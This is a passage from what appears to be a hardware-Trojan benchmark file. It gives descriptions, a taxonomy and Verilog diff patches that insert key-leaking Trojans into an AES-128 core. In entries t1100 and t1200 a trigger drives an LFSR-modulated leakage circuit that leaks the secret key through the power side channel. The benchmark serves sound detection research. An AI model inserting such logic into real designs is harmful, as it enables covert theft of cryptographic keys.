+			load[9] &lt;= key[1] ^ counter[1];	
+			load[10] &lt;= key[1] ^ counter[1];	
+			load[11] &lt;= key[1] ^ counter[1];	
+			load[12] &lt;= key[1] ^ counter[1];	
+			load[13] &lt;= key[1] ^ counter[1];	
+			load[14] &lt;= key[1] ^ counter[1];	
+			load[15] &lt;= key[1] ^ counter[1];	
+			
+			load[16] &lt;= key[2] ^ counter[2];	
+			load[17] &lt;= key[2] ^ counter[2];	
+			load[18] &lt;= key[2] ^ counter[2];	
+			load[19] &lt;= key[2] ^ counter[2];	
+			load[20] &lt;= key[2] ^ counter[2];	
+			load[21] &lt;= key[2] ^ counter[2];	
+			load[22] &lt;= key[2] ^ counter[2];	
+			load[23] &lt;= key[2] ^ counter[2];	
+			
+			load[24] &lt;= key[3] ^ counter[3];	
+			load[25] &lt;= key[3] ^ counter[3];	
+			load[26] &lt;= key[3] ^ counter[3];	
+			load[27] &lt;= key[3] ^ counter[3];	
+			load[28] &lt;= key[3] ^ counter[3];	
+			load[29] &lt;= key[3] ^ counter[3];	
+			load[30] &lt;= key[3] ^ counter[3];				
+			load[31] &lt;= key[3] ^ counter[3];				
+
+			load[32] &lt;= key[4] ^ counter[4];	
+			load[33] &lt;= key[4] ^ counter[4];	
+			load[34] &lt;= key[4] ^ counter[4];	
+			load[35] &lt;= key[4] ^ counter[4];	
+			load[36] &lt;= key[4] ^ counter[4];	
+			load[37] &lt;= key[4] ^ counter[4];	
+			load[38] &lt;= key[4] ^ counter[4];	
+			load[39] &lt;= key[4] ^ counter[4];	
+
+			load[40] &lt;= key[5] ^ counter[5];	
+			load[41] &lt;= key[5] ^ counter[5];	
+			load[42] &lt;= key[5] ^ counter[5];	
+			load[43] &lt;= key[5] ^ counter[5];	
+			load[44] &lt;= key[5] ^ counter[5];	
+			load[45] &lt;= key[5] ^ counter[5];	
+			load[46] &lt;= key[5] ^ counter[5];				
+			load[47] &lt;= key[5] ^ counter[5];				
+
+			load[48] &lt;= key[6] ^ counter[6];	
+			load[49] &lt;= key[6] ^ counter[6];				
+			load[50] &lt;= key[6] ^ counter[6];	
+			load[51] &lt;= key[6] ^ counter[6];	
+			load[52] &lt;= key[6] ^ counter[6];	
+			load[53] &lt;= key[6] ^ counter[6];	
+			load[54] &lt;= key[6] ^ counter[6];	
+			load[55] &lt;= key[6] ^ counter[6];
+			
+			load[56] &lt;= key[7] ^ counter[7];	
+			load[57] &lt;= key[7] ^ counter[7];	
+			load[58] &lt;= key[7] ^ counter[7];	
+			load[59] &lt;= key[7] ^ counter[7];	
+			load[60] &lt;= key[7] ^ counter[7];	
+			load[61] &lt;= key[7] ^ counter[7];	
+			load[62] &lt;= key[7] ^ counter[7];	
+			load[63] &lt;= key[7] ^ counter[7];				
+		end
+	
+endmodule
  </trojan_patch>    
  </trojan>
  <trojan uid="a2e70058-d66a-48ce-9271-ad4acfa2d651" name="t1100" abstraction_level="rtl" technology="">
	<trojan_description>
1.Home directory includes:

1.1 src
	---Codes for the AES algorithm, the test bench, and the Trojan

2.Trojan
Trojan Description
	Once a predefined sequence of input plaintext is observed, the Trojan leaks the secret key from a cryptographic chip running 
	the AES algorithm through a covert channel. The channel adapts the concepts from spread spectrum communications 
	(also known as Code-Division Multiple Access (CDMA)) to distribute the leakage of single bits over many clock cycles. 
	The Trojan employs this method by using a pseudo-random number generator (PRNG) to create a CDMA code sequence, 
	the PRNG initialized to the input plaintext. The code sequence is then used to XOR modulate the secret information bits. 
	The modulated sequence is forwarded to a leakage circuit (LC) to set up a covert CDMA channel in the power side-channel. 
	The LC is realized by connecting eight identical flip-flop elements to the single output of the XOR gate to mimic 
	a large capacitance [1].


Trojan Taxonomy
	Insertion phase: Design
	Abstraction level: Register Transfer level  
	Activation mechanism: Triggered Internally
	Effects: Leak Information
	Location: Processor
	Physical characteristics: Functional


[1] L. Lin, M. Kasper, T. G.neysu, C. Paar and W. Burleson, "Trojan Side-Channels: Lightweight Hardware Trojans 
through Side-Channel Engineering," 11th International Workshop Cryptographic Hardware and Embedded Systems (CHES), 
pp.382-395, 2009.

	</trojan_description>
  <trojan_patch>
diff -rupN aes/src/tjfree/lfsr_counter.v aes/src/tjin-t1100/lfsr_counter.v
--- aes/src/tjfree/lfsr_counter.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1100/lfsr_counter.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,25 @@
+
+// It implements X^20 + X^13 + X^9 + X^5 + 1
+module lfsr_counter (
+	input rst, clk, Tj_Trig, 
+	input [127:0] data, 
+   output [19:0] lfsr 
+	);
+
+	reg [19:0] lfsr_stream;
+	wire d0; 
+	
+	
+	assign lfsr = lfsr_stream; 
+	assign d0 = lfsr_stream[15] ^ lfsr_stream[11] ^ lfsr_stream[7] ^ lfsr_stream[0]; 
+
+	always @(posedge clk)
+		if (rst == 1) begin
+			lfsr_stream &lt;= data[19:0];
+		end else begin
+			if (Tj_Trig) begin
+				lfsr_stream &lt;= {d0,lfsr_stream[19:1]}; 
+			end	
+		end
+		
+endmodule
\ No newline at end of file
diff -rupN aes/src/tjfree/lfsr.v aes/src/tjin-t1100/lfsr.v
--- aes/src/tjfree/lfsr.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1100/lfsr.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,25 @@
+
+// It implements X^20 + X^13 + X^9 + X^5 + 1
+module lfsr_counter (
+	input rst, clk, Tj_Trig, 
+	input [127:0] data, 
+   output [19:0] lfsr 
+	);
+
+	reg [19:0] lfsr_stream;
+	wire d0; 
+	
+	
+	assign lfsr = lfsr_stream; 
+	assign d0 = lfsr_stream[15] ^ lfsr_stream[11] ^ lfsr_stream[7] ^ lfsr_stream[0]; 
+
+	always @(posedge clk)
+		if (rst == 1) begin
+			lfsr_stream &lt;= data[19:0];
+		end else begin
+			if (Tj_Trig) begin
+				lfsr_stream &lt;= {d0,lfsr_stream[19:1]}; 
+			end	
+		end
+		
+endmodule
\ No newline at end of file
diff -rupN aes/src/tjfree/tbtop.v aes/src/tjin-t1100/tbtop.v
--- aes/src/tjfree/tbtop.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1100/tbtop.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,102 @@
+`timescale 1ns / 1ps
+
+////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer:
+//
+// Create Date:   10:26:15 03/19/2013
+// Design Name:   top
+// Module Name:   D:/TrustHUB/HardwareTrojan/AES/AES128/AES-T1001/AES/tbTOP.v
+// Project Name:  AES
+// Target Device:  
+// Tool versions:  
+// Description: 
+//
+// Verilog Test Fixture created by ISE for module: top
+//
+// Dependencies:
+// 
+// Revision:
+// Revision 0.01 - File Created
+// Additional Comments:
+// 
+////////////////////////////////////////////////////////////////////////////////
+
+module tbTOP;
+
+	// Inputs
+	reg clk;
+	reg rst;
+	reg [127:0] state;
+	reg [127:0] key;
+
+	// Outputs
+	wire [127:0] out;
+	wire [63:0] Capacitance;
+
+	// Instantiate the Unit Under Test (UUT)
+	top uut (
+		.clk(clk), 
+		.rst(rst), 
+		.state(state), 
+		.key(key), 
+		.out(out), 
+		.Capacitance(Capacitance)
+	);
+
+	initial begin		clk = 0;
+		state = 128&apos;h3243f6a8_885a308d_313198a2_e0370734;
+		key = 0;
+		rst = 0;
+		
+		#20;
+		rst = 1;
+
+		#20;
+		rst = 0;
+		
+		#60;
+        /*
+         * TIMEGRP &quot;key&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
+         * TIMEGRP &quot;state&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
+         * TIMEGRP &quot;out&quot; OFFSET = OUT 2.2 ns BEFORE &quot;clk&quot; HIGH;
+         */
+        @ (negedge clk);
+        # 2;
+        state = 128&apos;h3243f6a8_885a308d_313198a2_e0370734;
+        key   = 128&apos;h2b7e1516_28aed2a6_abf71588_09cf4f3c;
+        #10;
+        state = 128&apos;h00112233_44556677_8899aabb_ccddeeff;
+        key   = 128&apos;h00010203_04050607_08090a0b_0c0d0e0f;
+        #10;
+        state = 128&apos;h0;
+        key   = 128&apos;h0;
+        #10;
+        state = 128&apos;h0;
+        key   = 128&apos;h1;
+        #10;
+        state = 128&apos;h1;
+        key   = 128&apos;h0;
+        #170;
+        if (out !== 128&apos;h3925841d02dc09fbdc118597196a0b32)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h69_c4_e0_d8_6a_7b_04_30_d8_cd_b7_80_70_b4_c5_5a)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h66_e9_4b_d4_ef_8a_2c_3b_88_4c_fa_59_ca_34_2b_2e)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h05_45_aa_d5_6d_a2_a9_7c_36_63_d1_43_2a_3d_1c_84)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h58_e2_fc_ce_fa_7e_30_61_36_7f_1d_57_a4_e7_45_5a)
+          begin $display(&quot;E&quot;); $finish; end
+        $display(&quot;Good.&quot;);
+        $finish;
+	end
+      
+    always #5 clk = ~clk;
+      
+endmodule
+
diff -rupN aes/src/tjfree/top.v aes/src/tjin-t1100/top.v
--- aes/src/tjfree/top.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1100/top.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,35 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    12:02:52 03/06/2013 
+// Design Name: 
+// Module Name:    top 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module top(
+    input clk,
+    input rst,
+    input [127:0] state,
+    input [127:0] key,
+    output [127:0] out,
+	 output [63:0] Capacitance
+    );
+
+	wire Tj_Trig;
+	aes_128 AES (clk, state, key, out); 
+	Trojan_Trigger Trigger (rst, state, Tj_Trig); 
+	TSC Trojan (rst, clk, Tj_Trig, key, state, Capacitance); 
+
+endmodule
diff -rupN aes/src/tjfree/trojan_trigger.v aes/src/tjin-t1100/trojan_trigger.v
--- aes/src/tjfree/trojan_trigger.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1100/trojan_trigger.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,53 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    13:40:39 03/08/2013 
+// Design Name: 
+// Module Name:    Trojan_Trigger 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module Trojan_Trigger(
+    input rst,
+    input [127:0] state,
+    output Tj_Trig
+    );
+
+	reg Tj_Trig;
+	reg State0, State1, State2, State3;
+	
+	always @(rst, state)
+	begin
+		if (rst == 1) begin
+			State0 &lt;= 0;
+			State1 &lt;= 0;
+			State2 &lt;= 0;
+			State3 &lt;= 0; 
+		end else if (state == 128&apos;h3243f6a8_885a308d_313198a2_e0370734) begin
+			State0 &lt;= 1;
+		end else if ((state == 128&apos;h00112233_44556677_8899aabb_ccddeeff) &amp;&amp; (State0 == 1)) begin
+			State1 &lt;= 1;
+		end else if ((state == 128&apos;h0) &amp;&amp; (State1 == 1)) begin
+			State2 &lt;= 1;
+		end else if ((state == 128&apos;h1) &amp;&amp; (State2 == 1)) begin
+			State3 &lt;= 1;
+		end
+	end
+
+	always @(State0, State1, State2, State3)
+	begin
+		Tj_Trig &lt;= State0 &amp; State1 &amp; State2 &amp; State3;
+	end
+
+endmodule
diff -rupN aes/src/tjfree/tsc.v aes/src/tjin-t1100/tsc.v
--- aes/src/tjfree/tsc.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1100/tsc.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,109 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    12:20:01 03/06/2013 
+// Design Name: 
+// Module Name:    TSC 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module TSC(
+    input rst,
+    input clk,
+	 input Tj_Trig, 
+    input [127:0] key,
+	 input [127:0] data,
+	 output [63:0] load
+    );
+
+	reg [63:0] load;
+	wire [19: 0] counter;
+	
+	lfsr_counter lfsr (rst, clk, Tj_Trig, data, counter);
+	always @ (posedge clk)
+		begin
+			load[0] &lt;= key[0] ^ counter[0];	
+			load[1] &lt;= key[0] ^ counter[0];	
+			load[2] &lt;= key[0] ^ counter[0];	
+			load[3] &lt;= key[0] ^ counter[0];	
+			load[4] &lt;= key[0] ^ counter[0];	
+			load[5] &lt;= key[0] ^ counter[0];	
+			load[6] &lt;= key[0] ^ counter[0];	
+			load[7] &lt;= key[0] ^ counter[0];	
+			
+			load[8] &lt;= key[1] ^ counter[1];	
+			load[9] &lt;= key[1] ^ counter[1];	
+			load[10] &lt;= key[1] ^ counter[1];	
+			load[11] &lt;= key[1] ^ counter[1];	
+			load[12] &lt;= key[1] ^ counter[1];	
+			load[13] &lt;= key[1] ^ counter[1];	
+			load[14] &lt;= key[1] ^ counter[1];	
+			load[15] &lt;= key[1] ^ counter[1];	
+			
+			load[16] &lt;= key[2] ^ counter[2];	
+			load[17] &lt;= key[2] ^ counter[2];	
+			load[18] &lt;= key[2] ^ counter[2];	
+			load[19] &lt;= key[2] ^ counter[2];	
+			load[20] &lt;= key[2] ^ counter[2];	
+			load[21] &lt;= key[2] ^ counter[2];	
+			load[22] &lt;= key[2] ^ counter[2];	
+			load[23] &lt;= key[2] ^ counter[2];	
+			
+			load[24] &lt;= key[3] ^ counter[3];	
+			load[25] &lt;= key[3] ^ counter[3];	
+			load[26] &lt;= key[3] ^ counter[3];	
+			load[27] &lt;= key[3] ^ counter[3];	
+			load[28] &lt;= key[3] ^ counter[3];	
+			load[29] &lt;= key[3] ^ counter[3];	
+			load[30] &lt;= key[3] ^ counter[3];				
+			load[31] &lt;= key[3] ^ counter[3];				
+
+			load[32] &lt;= key[4] ^ counter[4];	
+			load[33] &lt;= key[4] ^ counter[4];	
+			load[34] &lt;= key[4] ^ counter[4];	
+			load[35] &lt;= key[4] ^ counter[4];	
+			load[36] &lt;= key[4] ^ counter[4];	
+			load[37] &lt;= key[4] ^ counter[4];	
+			load[38] &lt;= key[4] ^ counter[4];	
+			load[39] &lt;= key[4] ^ counter[4];	
+
+			load[40] &lt;= key[5] ^ counter[5];	
+			load[41] &lt;= key[5] ^ counter[5];	
+			load[42] &lt;= key[5] ^ counter[5];	
+			load[43] &lt;= key[5] ^ counter[5];	
+			load[44] &lt;= key[5] ^ counter[5];	
+			load[45] &lt;= key[5] ^ counter[5];	
+			load[46] &lt;= key[5] ^ counter[5];				
+			load[47] &lt;= key[5] ^ counter[5];				
+
+			load[48] &lt;= key[6] ^ counter[6];	
+			load[49] &lt;= key[6] ^ counter[6];				
+			load[50] &lt;= key[6] ^ counter[6];	
+			load[51] &lt;= key[6] ^ counter[6];	
+			load[52] &lt;= key[6] ^ counter[6];	
+			load[53] &lt;= key[6] ^ counter[6];	
+			load[54] &lt;= key[6] ^ counter[6];	
+			load[55] &lt;= key[6] ^ counter[6];
+			
+			load[56] &lt;= key[7] ^ counter[7];	
+			load[57] &lt;= key[7] ^ counter[7];	
+			load[58] &lt;= key[7] ^ counter[7];	
+			load[59] &lt;= key[7] ^ counter[7];	
+			load[60] &lt;= key[7] ^ counter[7];	
+			load[61] &lt;= key[7] ^ counter[7];	
+			load[62] &lt;= key[7] ^ counter[7];	
+			load[63] &lt;= key[7] ^ counter[7];				
+		end
+	
+endmodule
  </trojan_patch>    
  </trojan>
  <trojan uid="41f2dce5-efb4-431a-979d-34298d1a9788" name="t1200" abstraction_level="rtl" technology="">
	<trojan_description>
1.Home directory includes:

1.1 src
	---Codes for the AES algorithm, the test bench, and the Trojan

2.Trojan
Trojan Description
	After each 128'hFFFF_FFFF_FFFF_FFFF_FFFF_FFFF_FFFF_FFFF encryptions, the Trojan gets activated and leaks the secret key 
	from a cryptographic chip running the AES algorithm through a covert channel. The channel adapts the concepts from 
	spread spectrum communications (also known as Code-Division Multiple Access (CDMA)) to distribute the leakage of single 
	bits over many clock cycles. The Trojan employs this method by using a pseudo-random number generator (PRNG) to create 
	a CDMA code sequence, the PRNG initialized to the input plaintext. The code sequence is then used to XOR modulate the 
	secret information bits. The modulated sequence is forwarded to a leakage circuit (LC) to set up a covert CDMA channel 
	in the power side-channel. The LC is realized by connecting eight identical flip-flop elements to the single output of 
	the XOR gate to mimic a large capacitance [1].


Trojan Taxonomy
	Insertion phase: Design
	Abstraction level: Register Transfer level  
	Activation mechanism: Triggered Internally
	Effects: Leak Information
	Location: Processor
	Physical characteristics: Functional


[1] L. Lin, M. Kasper, T. G.neysu, C. Paar and W. Burleson, "Trojan Side-Channels: Lightweight Hardware Trojans 
through Side-Channel Engineering," 11th International Workshop Cryptographic Hardware and Embedded Systems (CHES), 
pp.382-395, 2009.
	</trojan_description>
  <trojan_patch>
diff -rupN aes/src/tjfree/lfsr_counter.v aes/src/tjin-t1200/lfsr_counter.v
--- aes/src/tjfree/lfsr_counter.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1200/lfsr_counter.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,25 @@
+
+// It implements X^20 + X^13 + X^9 + X^5 + 1
+module lfsr_counter (
+	input rst, clk, Tj_Trig, 
+	input [127:0] data, 
+   output [19:0] lfsr 
+	);
+
+	reg [19:0] lfsr_stream;
+	wire d0; 
+	
+	
+	assign lfsr = lfsr_stream; 
+	assign d0 = lfsr_stream[15] ^ lfsr_stream[11] ^ lfsr_stream[7] ^ lfsr_stream[0]; 
+
+	always @(posedge clk)
+		if (rst == 1) begin
+			lfsr_stream &lt;= data[19:0];
+		end else begin
+			if (Tj_Trig) begin
+				lfsr_stream &lt;= {d0,lfsr_stream[19:1]}; 
+			end	
+		end
+		
+endmodule
\ No newline at end of file
diff -rupN aes/src/tjfree/lfsr.v aes/src/tjin-t1200/lfsr.v
--- aes/src/tjfree/lfsr.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1200/lfsr.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,25 @@
+
+// It implements X^20 + X^13 + X^9 + X^5 + 1
+module lfsr_counter (
+	input rst, clk, Tj_Trig, 
+	input [127:0] data, 
+   output [19:0] lfsr 
+	);
+
+	reg [19:0] lfsr_stream;
+	wire d0; 
+	
+	
+	assign lfsr = lfsr_stream; 
+	assign d0 = lfsr_stream[15] ^ lfsr_stream[11] ^ lfsr_stream[7] ^ lfsr_stream[0]; 
+
+	always @(posedge clk)
+		if (rst == 1) begin
+			lfsr_stream &lt;= data[19:0];
+		end else begin
+			if (Tj_Trig) begin
+				lfsr_stream &lt;= {d0,lfsr_stream[19:1]}; 
+			end	
+		end
+		
+endmodule
\ No newline at end of file
diff -rupN aes/src/tjfree/tbtop.v aes/src/tjin-t1200/tbtop.v
--- aes/src/tjfree/tbtop.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1200/tbtop.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,102 @@
+`timescale 1ns / 1ps
+
+////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer:
+//
+// Create Date:   10:26:15 03/19/2013
+// Design Name:   top
+// Module Name:   D:/TrustHUB/HardwareTrojan/AES/AES128/AES-T1001/AES/tbTOP.v
+// Project Name:  AES
+// Target Device:  
+// Tool versions:  
+// Description: 
+//
+// Verilog Test Fixture created by ISE for module: top
+//
+// Dependencies:
+// 
+// Revision:
+// Revision 0.01 - File Created
+// Additional Comments:
+// 
+////////////////////////////////////////////////////////////////////////////////
+
+module tbTOP;
+
+	// Inputs
+	reg clk;
+	reg rst;
+	reg [127:0] state;
+	reg [127:0] key;
+
+	// Outputs
+	wire [127:0] out;
+	wire [63:0] Capacitance;
+
+	// Instantiate the Unit Under Test (UUT)
+	top uut (
+		.clk(clk), 
+		.rst(rst), 
+		.state(state), 
+		.key(key), 
+		.out(out), 
+		.Capacitance(Capacitance)
+	);
+
+	initial begin		clk = 0;
+		state = 128&apos;h3243f6a8_885a308d_313198a2_e0370734;
+		key = 0;
+		rst = 0;
+		
+		#20;
+		rst = 1;
+
+		#20;
+		rst = 0;
+		
+		#60;
+        /*
+         * TIMEGRP &quot;key&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
+         * TIMEGRP &quot;state&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
+         * TIMEGRP &quot;out&quot; OFFSET = OUT 2.2 ns BEFORE &quot;clk&quot; HIGH;
+         */
+        @ (negedge clk);
+        # 2;
+        state = 128&apos;h3243f6a8_885a308d_313198a2_e0370734;
+        key   = 128&apos;h2b7e1516_28aed2a6_abf71588_09cf4f3c;
+        #10;
+        state = 128&apos;h00112233_44556677_8899aabb_ccddeeff;
+        key   = 128&apos;h00010203_04050607_08090a0b_0c0d0e0f;
+        #10;
+        state = 128&apos;h0;
+        key   = 128&apos;h0;
+        #10;
+        state = 128&apos;h0;
+        key   = 128&apos;h1;
+        #10;
+        state = 128&apos;h1;
+        key   = 128&apos;h0;
+        #170;
+        if (out !== 128&apos;h3925841d02dc09fbdc118597196a0b32)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h69_c4_e0_d8_6a_7b_04_30_d8_cd_b7_80_70_b4_c5_5a)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h66_e9_4b_d4_ef_8a_2c_3b_88_4c_fa_59_ca_34_2b_2e)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h05_45_aa_d5_6d_a2_a9_7c_36_63_d1_43_2a_3d_1c_84)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h58_e2_fc_ce_fa_7e_30_61_36_7f_1d_57_a4_e7_45_5a)
+          begin $display(&quot;E&quot;); $finish; end
+        $display(&quot;Good.&quot;);
+        $finish;
+	end
+      
+    always #5 clk = ~clk;
+      
+endmodule
+
diff -rupN aes/src/tjfree/top.v aes/src/tjin-t1200/top.v
--- aes/src/tjfree/top.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1200/top.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,35 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    12:02:52 03/06/2013 
+// Design Name: 
+// Module Name:    top 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module top(
+    input clk,
+    input rst,
+    input [127:0] state,
+    input [127:0] key,
+    output [127:0] out,
+	 output [63:0] Capacitance
+    );
+
+	wire Tj_Trig;
+	aes_128 AES (clk, state, key, out); 
+	Trojan_Trigger Trigger (rst, out, Tj_Trig); 
+	TSC Trojan (rst, clk, Tj_Trig, key, state, Capacitance); 
+
+endmodule
diff -rupN aes/src/tjfree/trojan_trigger.v aes/src/tjin-t1200/trojan_trigger.v
--- aes/src/tjfree/trojan_trigger.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1200/trojan_trigger.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,50 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    13:40:39 03/08/2013 
+// Design Name: 
+// Module Name:    Trojan_Trigger 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module Trojan_Trigger(
+    input rst,
+    input [127:0] out,
+    output Tj_Trig
+    );
+
+	reg Tj_Trig;
+	reg [127:0] Counter;
+	
+	always @(rst, out)
+	begin
+		if (rst == 1) begin
+			Counter &lt;= 0;
+		end else begin
+			Counter &lt;= Counter + 1;
+		end
+	end
+
+	always @(rst, Counter)
+	begin
+		if (rst == 1) begin
+			Tj_Trig &lt;= 0;
+		end else if (Counter == 128&apos;hffff_ffff_ffff_ffff_ffff_ffff_ffff_ffff) begin
+			Tj_Trig &lt;= 1;
+		end else begin
+			Tj_Trig &lt;= 0;		
+		end
+	end
+
+endmodule
diff -rupN aes/src/tjfree/tsc.v aes/src/tjin-t1200/tsc.v
--- aes/src/tjfree/tsc.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1200/tsc.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,109 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    12:20:01 03/06/2013 
+// Design Name: 
+// Module Name:    TSC 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module TSC(
+    input rst,
+    input clk,
+	 input Tj_Trig, 
+    input [127:0] key,
+	 input [127:0] data,
+	 output [63:0] load
+    );
+
+	reg [63:0] load;
+	wire [19: 0] counter;
+	
+	lfsr_counter lfsr (rst, clk, Tj_Trig, data, counter);
+	always @ (posedge clk)
+		begin
+			load[0] &lt;= key[0] ^ counter[0];	
+			load[1] &lt;= key[0] ^ counter[0];	
+			load[2] &lt;= key[0] ^ counter[0];	
+			load[3] &lt;= key[0] ^ counter[0];	
+			load[4] &lt;= key[0] ^ counter[0];	
+			load[5] &lt;= key[0] ^ counter[0];	
+			load[6] &lt;= key[0] ^ counter[0];	
+			load[7] &lt;= key[0] ^ counter[0];	
+			
+			load[8] &lt;= key[1] ^ counter[1];	
+			load[9] &lt;= key[1] ^ counter[1];	
+			load[10] &lt;= key[1] ^ counter[1];	
+			load[11] &lt;= key[1] ^ counter[1];	
+			load[12] &lt;= key[1] ^ counter[1];	
+			load[13] &lt;= key[1] ^ counter[1];	
+			load[14] &lt;= key[1] ^ counter[1];	
+			load[15] &lt;= key[1] ^ counter[1];	
+			
+			load[16] &lt;= key[2] ^ counter[2];	
+			load[17] &lt;= key[2] ^ counter[2];	
+			load[18] &lt;= key[2] ^ counter[2];	
+			load[19] &lt;= key[2] ^ counter[2];	
+			load[20] &lt;= key[2] ^ counter[2];	
+			load[21] &lt;= key[2] ^ counter[2];	
+			load[22] &lt;= key[2] ^ counter[2];	
+			load[23] &lt;= key[2] ^ counter[2];	
+			
+			load[24] &lt;= key[3] ^ counter[3];	
+			load[25] &lt;= key[3] ^ counter[3];	
+			load[26] &lt;= key[3] ^ counter[3];	
+			load[27] &lt;= key[3] ^ counter[3];	
+			load[28] &lt;= key[3] ^ counter[3];	
+			load[29] &lt;= key[3] ^ counter[3];	
+			load[30] &lt;= key[3] ^ counter[3];				
+			load[31] &lt;= key[3] ^ counter[3];				
+
+			load[32] &lt;= key[4] ^ counter[4];	
+			load[33] &lt;= key[4] ^ counter[4];	
+			load[34] &lt;= key[4] ^ counter[4];	
+			load[35] &lt;= key[4] ^ counter[4];	
+			load[36] &lt;= key[4] ^ counter[4];	
+			load[37] &lt;= key[4] ^ counter[4];	
+			load[38] &lt;= key[4] ^ counter[4];	
+			load[39] &lt;= key[4] ^ counter[4];	
+
+			load[40] &lt;= key[5] ^ counter[5];	
+			load[41] &lt;= key[5] ^ counter[5];	
+			load[42] &lt;= key[5] ^ counter[5];	
+			load[43] &lt;= key[5] ^ counter[5];	
+			load[44] &lt;= key[5] ^ counter[5];	
+			load[45] &lt;= key[5] ^ counter[5];	
+			load[46] &lt;= key[5] ^ counter[5];				
+			load[47] &lt;= key[5] ^ counter[5];				
+
+			load[48] &lt;= key[6] ^ counter[6];	
+			load[49] &lt;= key[6] ^ counter[6];				
+			load[50] &lt;= key[6] ^ counter[6];	
+			load[51] &lt;= key[6] ^ counter[6];	
+			load[52] &lt;= key[6] ^ counter[6];	
+			load[53] &lt;= key[6] ^ counter[6];	
+			load[54] &lt;= key[6] ^ counter[6];	
+			load[55] &lt;= key[6] ^ counter[6];
+			
+			load[56] &lt;= key[7] ^ counter[7];	
+			load[57] &lt;= key[7] ^ counter[7];	
+			load[58] &lt;= key[7] ^ counter[7];	
+			load[59] &lt;= key[7] ^ counter[7];	
+			load[60] &lt;= key[7] ^ counter[7];	
+			load[61] &lt;= key[7] ^ counter[7];	
+			load[62] &lt;= key[7] ^ counter[7];	
+			load[63] &lt;= key[7] ^ counter[7];				
+		end
+	
+endmodule
  </trojan_patch>    
  </trojan>
  <trojan uid="b0caf4e2-1b4b-4686-816c-8ea601863a40" name="t1300" abstraction_level="rtl" technology="">
	<trojan_description>
1.Home directory includes:

